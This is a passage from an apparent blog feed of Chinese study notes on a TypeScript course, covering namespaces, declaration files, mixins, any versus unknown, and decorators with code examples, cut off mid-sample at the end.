    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1wR4y1377K?vd_source=abff2190dd215e2033f2ec57123dd1d6">小满TypeScript基础教程全集（完结）</a></p>
<h1 id="namespace"><a href="#namespace" class="headerlink" title="namespace"></a>namespace</h1><p>工作中经常无法避免全局变量造成的污染，于是TypeScript提供了namespace关键字，避免这个问题的出现</p>
<ul>
<li>作用：内部模块，主要用于组织代码，避免命名冲突。</li>
<li>表现：<ul>
<li>命名空间内的类默认私有</li>
</ul>
</li>
<li>语法：<ul>
<li>通过export暴露</li>
<li>通过namespace关键字定义</li>
</ul>
</li>
</ul>
<h1 id="TS模块"><a href="#TS模块" class="headerlink" title="TS模块"></a>TS模块</h1><p>TS与ES2015一样，任何包含顶级import或者export的文件都被当成一个模块</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202307181444308.png"></p>
<p>相反，如果一个文件不带顶级的import或者export声明，那么它的内容就是全局可见的</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202307181440580.png"></p>
<h1 id="TS命名空间"><a href="#TS命名空间" class="headerlink" title="TS命名空间"></a>TS命名空间</h1><p>更推荐使用ES模块作为模块化的解决方案，而不是过度使用命名空间</p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>命名空间中要通过export将想要暴露的部分导出，不导出就不能被读取</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202307181452326.png"></p>
<p>namespace会被编译成这样</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> A;</span><br><span class="line">(<span class="keyword">function</span> (<span class="params">A</span>) &#123;</span><br><span class="line">    A.<span class="property">ab</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> c = <span class="number">3</span>;</span><br><span class="line">&#125;)(A || (A = &#123;&#125;));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(B.<span class="property">ab</span>);</span><br><span class="line"><span class="comment">// console.log(B.c)  // 报错</span></span><br></pre></td></tr></table></figure>

<h2 id="嵌套命名空间"><a href="#嵌套命名空间" class="headerlink" title="嵌套命名空间"></a>嵌套命名空间</h2><p>namespace可以嵌套</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> a &#123;</span><br><span class="line">    <span class="keyword">export</span> <span class="keyword">namespace</span> b &#123;</span><br><span class="line">        <span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">Vue</span> &#123;</span><br><span class="line">            <span class="attr">parameters</span>: <span class="built_in">string</span></span><br><span class="line">            <span class="title function_">constructor</span>(<span class="params">parameters: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">parameters</span> = parameters</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> v = a.<span class="property">b</span>.<span class="property">Vue</span></span><br><span class="line"><span class="keyword">new</span> <span class="title function_">v</span>(<span class="string">&#x27;1&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="抽离命名空间"><a href="#抽离命名空间" class="headerlink" title="抽离命名空间"></a>抽离命名空间</h2><p>可以导出&#x2F;导入命名空间</p>
<p>a.ts：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">namespace</span> V &#123;</span><br><span class="line">    <span class="keyword">export</span> <span class="keyword">const</span> a = <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>b.ts：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;V&#125; <span class="keyword">from</span> <span class="string">&#x27;../observer/index&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(V)  <span class="comment">// -&gt;&#123;a:1&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="简化命名空间"><a href="#简化命名空间" class="headerlink" title="简化命名空间"></a>简化命名空间</h2><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> A  &#123;</span><br><span class="line">    <span class="keyword">export</span> <span class="keyword">namespace</span> B &#123;</span><br><span class="line">        <span class="keyword">export</span> <span class="keyword">const</span> C = <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 给一个嵌套命名空间重新命名</span></span><br><span class="line"><span class="keyword">import</span> X = A.<span class="property">B</span>.<span class="property">C</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(X)	<span class="comment">// -&gt;1</span></span><br></pre></td></tr></table></figure>

<h2 id="合并命名空间"><a href="#合并命名空间" class="headerlink" title="合并命名空间"></a>合并命名空间</h2><p>声明同名的命名空间，不会出现代替，而是会出现合并现象</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202307181504473.png"></p>
]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>TypeScript</tag>
      </tags>
  </entry>
  <entry>
    <title>声明文件d.ts</title>
    <url>/web/study/TypeScript/18.%E5%A3%B0%E6%98%8E%E6%96%87%E4%BB%B6d.ts.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1wR4y1377K?vd_source=abff2190dd215e2033f2ec57123dd1d6">小满TypeScript基础教程全集（完结）</a></p>
<h1 id="declare关键字"><a href="#declare关键字" class="headerlink" title="declare关键字"></a>declare关键字</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">declare var 声明全局变量</span><br><span class="line">declare function 声明全局方法</span><br><span class="line">declare class 声明全局类</span><br><span class="line">declare enum 声明全局枚举类型</span><br><span class="line">declare namespace 声明（含有子属性的）全局对象</span><br><span class="line">declare module 声明模块</span><br><span class="line">interface 和 type 声明全局类型</span><br><span class="line">/// &lt;reference /&gt; 三斜线指令</span><br></pre></td></tr></table></figure>

<p>使用declare定义类型后，编码时就能得到代码提示</p>
<h1 id="声明文件"><a href="#声明文件" class="headerlink" title="声明文件"></a>声明文件</h1><p>当使用第三方库时，需要引用它的声明文件，才能获得对应的代码补全、接口提示等功能</p>
<p>有的库自带声明文件，但有的不带，引用不带声明文件的库时，TS会报错</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202307191314907.png"></p>
<p>TS社区的人会为一些知名JS库贡献声明文件，可以直接引入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install @types/[库名] -D</span><br></pre></td></tr></table></figure>

<p>如果确实没有声明文件，可以自己定义一个</p>
<h1 id="定义声明文件"><a href="#定义声明文件" class="headerlink" title="定义声明文件"></a>定义声明文件</h1><p>在express.d.ts中使用declare module定义express模块的类型：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">declare</span> <span class="variable language_">module</span> <span class="string">&quot;express&quot;</span> &#123;</span><br><span class="line">  <span class="keyword">interface</span> <span class="title class_">Router</span> &#123;</span><br><span class="line">    <span class="title function_">get</span>(<span class="attr">path</span>:<span class="built_in">string</span>,<span class="attr">cb</span>:<span class="function">(<span class="params">req:<span class="built_in">any</span>,res:<span class="built_in">any</span></span>)=&gt;</span><span class="built_in">void</span>):<span class="built_in">void</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">interface</span> <span class="title class_">App</span> &#123;</span><br><span class="line">    <span class="title function_">use</span>(<span class="attr">path</span>:<span class="built_in">string</span>,<span class="attr">router</span>:<span class="built_in">any</span>):<span class="built_in">void</span></span><br><span class="line">    <span class="title function_">listen</span>(<span class="attr">port</span>:<span class="built_in">number</span>,cb?:<span class="function">()=&gt;</span><span class="built_in">void</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">interface</span> <span class="title class_">Express</span> &#123;</span><br><span class="line">    ():<span class="title class_">App</span></span><br><span class="line">    <span class="title class_">Router</span>():<span class="title class_">Router</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="attr">express</span>:<span class="title class_">Express</span></span><br><span class="line">  <span class="keyword">export</span> <span class="keyword">default</span> express</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>TypeScript</tag>
      </tags>
  </entry>
  <entry>
    <title>Mixins混入</title>
    <url>/web/study/TypeScript/19.Mixins%E6%B7%B7%E5%85%A5.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1wR4y1377K?vd_source=abff2190dd215e2033f2ec57123dd1d6">小满TypeScript基础教程全集（完结）</a></p>
<h1 id="对象混入"><a href="#对象混入" class="headerlink" title="对象混入"></a>对象混入</h1><p>使用ES6的<code>Object.assign</code>可以合并多个对象</p>
<p>合并完的对象会被TS推断为交叉类型</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Name</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Age</span> &#123;</span><br><span class="line">  <span class="attr">age</span>: <span class="built_in">number</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Gender</span> &#123;</span><br><span class="line">  <span class="attr">gender</span>: <span class="built_in">number</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="attr">a</span>:<span class="title class_">Name</span> = &#123;<span class="attr">name</span>:<span class="string">&quot;yajue&quot;</span>&#125;</span><br><span class="line"><span class="keyword">let</span> <span class="attr">b</span>:<span class="title class_">Age</span> = &#123;<span class="attr">age</span>:<span class="number">24</span>&#125;</span><br><span class="line"><span class="keyword">let</span> <span class="attr">c</span>:<span class="title class_">Gender</span> = &#123;<span class="attr">gender</span>:<span class="number">0</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj = <span class="title class_">Object</span>.<span class="title function_">assign</span>(a,b,c)  <span class="comment">// obj的类型：Name &amp; Age &amp; Gender</span></span><br></pre></td></tr></table></figure>

<h1 id="类混入"><a href="#类混入" class="headerlink" title="类混入"></a>类混入</h1><p>不使用extends而是使用implements，把类当成接口</p>
<p>使用<code>Object.getOwnPropertyNames</code>可以获取对象的所有属性名（除了继承的属性），返回属性名数组</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">  <span class="attr">type</span>:<span class="built_in">boolean</span></span><br><span class="line">  <span class="title function_">changeType</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">type</span>=!<span class="variable language_">this</span>.<span class="property">type</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> &#123;</span><br><span class="line">  <span class="attr">name</span>:<span class="built_in">string</span></span><br><span class="line">  <span class="title function_">getName</span>(): <span class="built_in">string</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">name</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// C类是A类和B类的混合，此处只写一些占位符简单定义</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span> <span class="keyword">implements</span> A,B &#123;</span><br><span class="line">  <span class="attr">type</span>: <span class="built_in">boolean</span> = <span class="literal">false</span></span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span> = <span class="string">&quot;yajue&quot;</span></span><br><span class="line">  <span class="attr">changeType</span>:<span class="function">()=&gt;</span> <span class="built_in">void</span></span><br><span class="line">  <span class="attr">getName</span>:<span class="function">()=&gt;</span> <span class="built_in">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 帮助函数，进行混入操作</span></span><br><span class="line"><span class="comment">// 遍历A和B的属性和方法逐个复制给C，顶替掉原先定义的占位符</span></span><br><span class="line"><span class="title function_">mixins</span>(C,[A,B])</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">mixins</span>(<span class="params">curClas:<span class="built_in">any</span>,itemCls:<span class="built_in">any</span>[]</span>) &#123;</span><br><span class="line">  itemCls.<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span>=&gt;</span> &#123;</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">getOwnPropertyNames</span>(item.<span class="property"><span class="keyword">prototype</span></span>).<span class="title function_">forEach</span>(<span class="function"><span class="params">name</span>=&gt;</span> &#123;</span><br><span class="line">      curClas.<span class="property"><span class="keyword">prototype</span></span>[name] = item.<span class="property"><span class="keyword">prototype</span></span>[name]</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>TypeScript</tag>
      </tags>
  </entry>
  <entry>
    <title>任意类型</title>
    <url>/web/study/TypeScript/2.%E4%BB%BB%E6%84%8F%E7%B1%BB%E5%9E%8B.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1wR4y1377K?vd_source=abff2190dd215e2033f2ec57123dd1d6">小满TypeScript基础教程全集（完结）</a></p>
<h1 id="any类型"><a href="#any类型" class="headerlink" title="any类型"></a>any类型</h1><p>表示任意的类型，没有强制限定是什么的类型</p>
<p>可以对any进行任何操作，而不被检查类型</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">anys</span>:<span class="built_in">any</span> = <span class="number">123</span></span><br><span class="line">anys = <span class="string">&#x27;123&#x27;</span></span><br><span class="line">anys = <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>声明时没有指定类型的变量默认为any</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> anys;</span><br><span class="line">anys = <span class="string">&#x27;123&#x27;</span></span><br><span class="line">anys = <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>如果使用any，就失去了TS类型检测的作用，也没有代码提示，和JS没什么两样了<del>AnyScript</del></p>
<h1 id="unknown类型"><a href="#unknown类型" class="headerlink" title="unknown类型"></a>unknown类型</h1><p>表示不知道的类型，TS3.0引入</p>
<p>与any一样，所有类型都可以被分配给unknown</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// unknown 可以定义任何类型的值</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">value</span>: <span class="built_in">unknown</span>;</span><br><span class="line"> </span><br><span class="line">value = <span class="literal">true</span>;             <span class="comment">// OK</span></span><br><span class="line">value = <span class="number">42</span>;               <span class="comment">// OK</span></span><br><span class="line">value = <span class="string">&quot;Hello World&quot;</span>;    <span class="comment">// OK</span></span><br><span class="line">value = [];               <span class="comment">// OK</span></span><br><span class="line">value = &#123;&#125;;               <span class="comment">// OK</span></span><br><span class="line">value = <span class="literal">null</span>;             <span class="comment">// OK</span></span><br><span class="line">value = <span class="literal">undefined</span>;        <span class="comment">// OK</span></span><br><span class="line">value = <span class="title class_">Symbol</span>(<span class="string">&quot;type&quot;</span>);   <span class="comment">// OK</span></span><br></pre></td></tr></table></figure>

<h1 id="any和unknown的区别"><a href="#any和unknown的区别" class="headerlink" title="any和unknown的区别"></a>any和unknown的区别</h1><p>unknown类型比any类型更加严格，但也更加安全</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 这样写会报错</span></span><br><span class="line"><span class="comment">// unknow类型不能作为子类型只能作为父类型</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">names</span>:<span class="built_in">unknown</span> = <span class="string">&#x27;123&#x27;</span></span><br><span class="line"><span class="comment">// unknown类型不能赋值给其他类型</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">names2</span>:<span class="built_in">string</span> = names</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 这样写没问题</span></span><br><span class="line"><span class="comment">// any可以作为父类型和子类型</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">names</span>:<span class="built_in">any</span> = <span class="string">&#x27;123&#x27;</span></span><br><span class="line"><span class="comment">// any类型可以赋值给其他类型</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">names2</span>:<span class="built_in">string</span> = names   </span><br><span class="line"> </span><br><span class="line"><span class="comment">// unknown变量只能赋值给unknown或any变量</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">bbb</span>:<span class="built_in">unknown</span> = <span class="string">&#x27;123&#x27;</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">aaa</span>:<span class="built_in">any</span>= <span class="string">&#x27;456&#x27;</span></span><br><span class="line">aaa = bbb</span><br></pre></td></tr></table></figure>

<hr>
<p>在赋引用类型时也有区别</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 如果是any类型，调用属性和方法不会报错，即使没有这个属性或方法</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">obj1</span>:<span class="built_in">any</span> = &#123;<span class="attr">b</span>:<span class="number">1</span>&#125;</span><br><span class="line">obj1.<span class="property">a</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// 如果是unknow，调用属性和方法会报错，即使有这个属性或方法</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">obj2</span>:<span class="built_in">unknown</span> = &#123;<span class="attr">b</span>:<span class="number">1</span>,<span class="attr">ccc</span>:():<span class="function"><span class="params">number</span>=&gt;</span><span class="number">213</span>&#125;</span><br><span class="line">obj2.<span class="property">b</span></span><br><span class="line">obj2.<span class="title function_">ccc</span>()</span><br></pre></td></tr></table></figure>

<h1 id="类型级别"><a href="#类型级别" class="headerlink" title="类型级别"></a>类型级别</h1><ul>
<li>any和unknown都是顶级类型(top type)</li>
<li>第二级是Object</li>
<li>第三级是Number、String、Boolean这些包装器对象</li>
<li>第四级是number、string、boolean这些基本类型</li>
<li>第五级是具体的值，例如1、”yajue”、false</li>
<li>第六级是never类型</li>
</ul>
<p>上级类型对下级而言是包含的关系</p>
]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>TypeScript</tag>
      </tags>
  </entry>
  <entry>
    <title>装饰器Decorator</title>
    <url>/web/study/TypeScript/20.%E8%A3%85%E9%A5%B0%E5%99%A8Decorator.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1wR4y1377K?vd_source=abff2190dd215e2033f2ec57123dd1d6">小满TypeScript基础教程全集（完结）</a></p>
<h1 id="装饰器"><a href="#装饰器" class="headerlink" title="装饰器"></a>装饰器</h1><p>Decorator 装饰器是一项实验性特性，在未来的版本中可能会发生改变</p>
<p>它们不仅增加了代码的可读性，清晰地表达了意图</p>
<p>而且提供了一种方便的手段，增加或修改类的功能</p>
<p>若要启用实验性的装饰器特性，必须在命令行或tsconfig.json里启用编译器选项</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;experimentalDecorators&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;emitDecoratorMetadata&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br></pre></td></tr></table></figure>

<p>装饰器是一种特殊类型的声明，它能够被附加到类声明，方法， 访问符，属性或参数上</p>
<h1 id="类装饰器"><a href="#类装饰器" class="headerlink" title="类装饰器"></a>类装饰器</h1><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// target：类的构造器</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Base</span>:<span class="title class_">ClassDecorator</span> = <span class="function">(<span class="params">target</span>)=&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(target)</span><br><span class="line">  <span class="comment">// 可以不破坏类内部代码块结构而增加属性和方法</span></span><br><span class="line">  target.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">__yajue</span> = <span class="string">&quot;yjsp&quot;</span></span><br><span class="line">  target.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">fn</span> = <span class="function">()=&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;24岁，是学生&quot;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 编译阶段就会调用这个函数，无需手动调用</span></span><br><span class="line"><span class="meta">@Base</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Http</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Base(Http)   // 和在类声明前使用@Base是等价的</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> http = <span class="keyword">new</span> <span class="title class_">Http</span>() <span class="keyword">as</span> <span class="built_in">any</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(http.<span class="property">__yajue</span>)	<span class="comment">// -&gt; &quot;yjsp&quot;</span></span><br><span class="line">http.<span class="title function_">fn</span>()</span><br></pre></td></tr></table></figure>

<h2 id="装饰器工厂"><a href="#装饰器工厂" class="headerlink" title="装饰器工厂"></a>装饰器工厂</h2><p>使用函数柯里化，就能给装饰器传自定义参数</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">Base</span> = (<span class="params">str:<span class="built_in">string</span></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="attr">fn</span>: <span class="title class_">ClassDecorator</span> = <span class="function">(<span class="params">target</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(target)</span><br><span class="line">    target.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">name</span> = str</span><br><span class="line">    target.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">fn</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;24岁，是学生&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> fn</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Base</span>(<span class="string">&quot;yajue&quot;</span>)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Http</span> &#123; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> http = <span class="keyword">new</span> <span class="title class_">Http</span>() <span class="keyword">as</span> <span class="built_in">any</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(http.<span class="property">name</span>)    <span class="comment">// -&gt;&quot;yajue&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="装饰器组合"><a href="#装饰器组合" class="headerlink" title="装饰器组合"></a>装饰器组合</h2><p>可以同时使用多个装饰器</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">Base</span> = (<span class="params">str:<span class="built_in">string</span></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="attr">fn</span>: <span class="title class_">ClassDecorator</span> = <span class="function">(<span class="params">target</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(target)</span><br><span class="line">    target.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">name</span> = str</span><br><span class="line">    target.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">fn</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;24岁，是学生&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> fn</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">Omg</span> = (<span class="params">target</span>)=&gt; &#123;</span><br><span class="line">  target.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">age</span> = <span class="number">24</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Base</span>(<span class="string">&quot;yajue&quot;</span>)</span><br><span class="line"><span class="meta">@Omg</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Http</span> &#123; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> http = <span class="keyword">new</span> <span class="title class_">Http</span>() <span class="keyword">as</span> <span class="built_in">any</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(http.<span class="property">name</span>)    <span class="comment">// -&gt;&quot;yajue&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(http.<span class="property">age</span>)     <span class="comment">// -&gt;24</span></span><br></pre></td></tr></table></figure>

<h1 id="方法装饰器"><a href="#方法装饰器" class="headerlink" title="方法装饰器"></a>方法装饰器</h1><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&quot;axios&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">Get</span> = (<span class="params">url:<span class="built_in">string</span></span>)=&gt; &#123;</span><br><span class="line">  <span class="comment">// target：原型对象   key：方法名   descriptior：描述符</span></span><br><span class="line">  <span class="keyword">const</span> <span class="attr">fn</span>:<span class="title class_">MethodDecorator</span> = <span class="function">(<span class="params">target,key,descriptor: PropertyDescriptor</span>)=&gt;</span> &#123;</span><br><span class="line">    axios.<span class="title function_">get</span>(url).<span class="title function_">then</span>(<span class="function"><span class="params">res</span>=&gt;</span>&#123;</span><br><span class="line">      <span class="comment">// 函数体</span></span><br><span class="line">      descriptor.<span class="title function_">value</span>(res.<span class="property">data</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> fn</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Http</span> &#123;</span><br><span class="line">  <span class="meta">@Get</span>(<span class="string">&quot;https://api.apiopen.top/api/getHaoKanVideo?page=0&amp;size=10&quot;</span>)</span><br><span class="line">  <span class="title function_">getList</span>(<span class="params">data:<span class="built_in">any</span></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(data.<span class="property">result</span>.<span class="property">list</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="参数装饰器"><a href="#参数装饰器" class="headerlink" title="参数装饰器"></a>参数装饰器</h1><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&quot;axios&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;reflect-metadata&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">Get</span> = (<span class="params">url:<span class="built_in">string</span></span>)=&gt; &#123;</span><br><span class="line">  <span class="comment">// target：原型对象   _：方法名   descriptior：描述符</span></span><br><span class="line">  <span class="keyword">const</span> <span class="attr">fn</span>:<span class="title class_">MethodDecorator</span> = <span class="function">(<span class="params">target,_,descriptor: PropertyDescriptor</span>)=&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> key = <span class="title class_">Reflect</span>.<span class="title function_">getMetadata</span>(<span class="string">&quot;key&quot;</span>,target)</span><br><span class="line">    axios.<span class="title function_">get</span>(url).<span class="title function_">then</span>(<span class="function"><span class="params">res</span>=&gt;</span>&#123;</span><br><span class="line">      <span class="comment">// 函数体</span></span><br><span class="line">      descriptor.<span class="title function_">value</span>(key? res.<span class="property">data</span>[key]: res.<span class="property">data</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> fn</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">Result</span> = (<span class="params"></span>)=&gt; &#123;</span><br><span class="line">  <span class="comment">// target：原型对象   key：方法名   index：参数所在位置</span></span><br><span class="line">  <span class="keyword">const</span> <span class="attr">fn</span>:<span class="title class_">ParameterDecorator</span> = <span class="function">(<span class="params">target,key,index</span>)=&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 参数装饰器优先于方法装饰器，所以这里使用元数据</span></span><br><span class="line">    <span class="title class_">Reflect</span>.<span class="title function_">defineMetadata</span>(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;result&quot;</span>,target)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> fn</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Http</span> &#123;</span><br><span class="line">  <span class="meta">@Get</span>(<span class="string">&quot;https://api.apiopen.top/api/getHaoKanVideo?page=0&amp;size=10&quot;</span>)</span><br><span class="line">  <span class="title function_">getList</span>(<span class="params"><span class="meta">@Result</span>() data:<span 